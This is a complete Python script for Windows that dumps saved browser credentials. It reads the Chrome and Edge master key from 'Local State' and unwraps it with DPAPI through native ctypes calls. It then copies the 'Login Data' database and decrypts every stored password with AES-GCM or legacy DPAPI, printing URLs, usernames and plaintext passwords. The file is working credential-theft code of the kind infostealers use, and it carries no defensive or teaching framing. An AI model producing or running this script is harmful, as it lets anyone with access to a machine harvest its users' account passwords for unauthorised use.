import os
import json
import base64
import sqlite3
import shutil
import ctypes
from ctypes import wintypes
from pathlib import Path

# ==============================================================================
# NATIVE WINDOWS CRYPTO (CTYPES) - Removes need for pywin32/pycryptodome
# ==============================================================================

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(encrypted_bytes):
    """
    Decrypts data using Windows DPAPI via CryptUnprotectData (crypt32.dll).
    Used for the Master Key.
    """
    crypt32 = ctypes.windll.crypt32
    
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(ctypes.c_char_p(encrypted_bytes), ctypes.POINTER(ctypes.c_byte)))
    blob_out = DATA_BLOB()
    
    # Flags: CRYPTPROTECT_UI_FORBIDDEN (0x1)
    if not crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0x1, ctypes.byref(blob_out)):
        raise RuntimeError("DPAPI decryption failed")
    
    # Copy data out into a Python bytes object
    size = blob_out.cbData
    ptr = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_char * size))
    decrypted = bytes(ptr.contents)
    
    # Free memory allocated by LocalFree
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return decrypted

# --- BCrypt (AES-GCM) Constants and Structs ---
STATUS_SUCCESS = 0x00000000
BCRYPT_AES_ALGORITHM = "AES"
BCRYPT_CHAINING_MODE = "ChainingMode"
BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM"

class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
    _fields_ = [
        ('cbSize', wintypes.ULONG),
        ('dwInfoVersion', wintypes.ULONG),
        ('pbNonce', ctypes.POINTER(ctypes.c_byte)),
        ('cbNonce', wintypes.ULONG),
        ('pbAuthData', ctypes.POINTER(ctypes.c_byte)),
        ('cbAuthData', wintypes.ULONG),
        ('pbTag', ctypes.POINTER(ctypes.c_byte)),
        ('cbTag', wintypes.ULONG),
        ('pbMacContext', ctypes.POINTER(ctypes.c_byte)),
        ('cbMacContext', wintypes.ULONG),
        ('cbAAD', wintypes.ULONG),
        ('cbData', ctypes.c_ulonglong),
        ('dwFlags', wintypes.ULONG)
    ]

def decrypt_aes_gcm(key, nonce, ciphertext, tag):
    """
    Decrypts AES-GCM using native Windows CNG (bcrypt.dll).
    Used for Chrome v80+ passwords.
    """
    bcrypt = ctypes.windll.bcrypt
    
    # Pointers
    hAlg = wintypes.HANDLE()
    hKey = wintypes.HANDLE()
    
    try:
        # 1. Open Algorithm Provider
        ret = bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), ctypes.c_wchar_p(BCRYPT_AES_ALGORITHM), None, 0)
        if ret != STATUS_SUCCESS: raise RuntimeError(f"BCryptOpenAlgorithmProvider failed: {ret:#x}")

        # 2. Set Chaining Mode to GCM
        ret = bcrypt.BCryptSetProperty(hAlg, ctypes.c_wchar_p(BCRYPT_CHAINING_MODE), 
                                       ctypes.c_wchar_p(BCRYPT_CHAIN_MODE_GCM), 
                                       len(BCRYPT_CHAIN_MODE_GCM) * 2 + 2, 0)
        if ret != STATUS_SUCCESS: raise RuntimeError(f"BCryptSetProperty failed: {ret:#x}")

        # 3. Generate Key
        # Note: key must be kept alive during BCryptDecrypt
        key_buf = (ctypes.c_byte * len(key)).from_buffer_copy(key)
        ret = bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), None, 0, key_buf, len(key), 0)
        if ret != STATUS_SUCCESS: raise RuntimeError(f"BCryptGenerateSymmetricKey failed: {ret:#x}")

        # 4. Prepare GCM Info Struct
        auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
        auth_info.cbSize = ctypes.sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)
        auth_info.dwInfoVersion = 1
        
        # Buffers must be kept alive
        nonce_buf = (ctypes.c_byte * len(nonce)).from_buffer_copy(nonce)
        tag_buf = (ctypes.c_byte * len(tag)).from_buffer_copy(tag)
        
        auth_info.pbNonce = ctypes.cast(nonce_buf, ctypes.POINTER(ctypes.c_byte))
        auth_info.cbNonce = len(nonce)
        auth_info.pbTag = ctypes.cast(tag_buf, ctypes.POINTER(ctypes.c_byte))
        auth_info.cbTag = len(tag)

        # 5. Decrypt
        # We process in place or new buffer. Let's use new buffer.
        cipher_buf = (ctypes.c_byte * len(ciphertext)).from_buffer_copy(ciphertext)
        plain_buf = (ctypes.c_byte * len(ciphertext))()
        cbResult = wintypes.ULONG()

        ret = bcrypt.BCryptDecrypt(hKey, cipher_buf, len(ciphertext), ctypes.byref(auth_info), 
                                   None, 0, plain_buf, len(plain_buf), ctypes.byref(cbResult), 0)
        
        if ret != STATUS_SUCCESS: raise RuntimeError(f"BCryptDecrypt failed: {ret:#x}")

        return bytes(plain_buf[:cbResult.value])

    finally:
        if hKey: bcrypt.BCryptDestroyKey(hKey)
        if hAlg: bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

# ==============================================================================
# MAIN LOGIC
# ==============================================================================

def get_master_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        # Remove 'DPAPI' prefix
        return decrypt_dpapi(encrypted_key[5:])
    except Exception as e:
        print(f"[-] Failed to get master key: {e}")
        return None

def process_browser(name, path_template):
    local_appdata = os.environ.get('LOCALAPPDATA', '')
    user_data_dir = Path(local_appdata) / path_template
    
    if not user_data_dir.exists():
        return

    print(f"\n[*] Found {name}: {user_data_dir}")
    
    # 1. Get Master Key
    master_key = get_master_key(user_data_dir / "Local State")
    if not master_key:
        return

    # 2. Locate Login Data (Default profile)
    login_db = user_data_dir / "Default" / "Login Data"
    if not login_db.exists():
        print("[-] Login Data DB not found in Default profile.")
        return

    # 3. Copy DB to temp to avoid locks
    temp_db = Path(os.environ.get('TEMP')) / "login_tmp.db"
    try:
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
        
        count = 0
        for url, username, encrypted_pwd in cursor.fetchall():
            password = ""
            try:
                # V10 = AES-GCM
                if encrypted_pwd.startswith(b'v10') or encrypted_pwd.startswith(b'v11'):
                    nonce = encrypted_pwd[3:15]
                    ciphertext = encrypted_pwd[15:-16]
                    tag = encrypted_pwd[-16:]
                    
                    decrypted_bytes = decrypt_aes_gcm(master_key, nonce, ciphertext, tag)
                    password = decrypted_bytes.decode('utf-8')
                else:
                    # Legacy DPAPI
                    password = decrypt_dpapi(encrypted_pwd).decode('utf-8')
                
                print(f"[{count}] {url}")
                print(f"    User: {username}")
                print(f"    Pass: {password}")
                count += 1
                
            except Exception as e:
                # print(f"[-] Error decrypting row: {e}") # Verbose
                pass
                
        print(f"[+] Total credentials found: {count}")
        conn.close()
        
    except Exception as e:
        print(f"[!] DB Error: {e}")
    finally:
        if temp_db.exists():
            try: os.unlink(temp_db)
            except: pass

def main():
    print("[*] Starting Native Python Decryptor...")
    process_browser("Chrome", r"Google\Chrome\User Data")
    process_browser("Edge", r"Microsoft\Edge\User Data")
    print("[*] Done.")

if __name__ == "__main__":
    main()
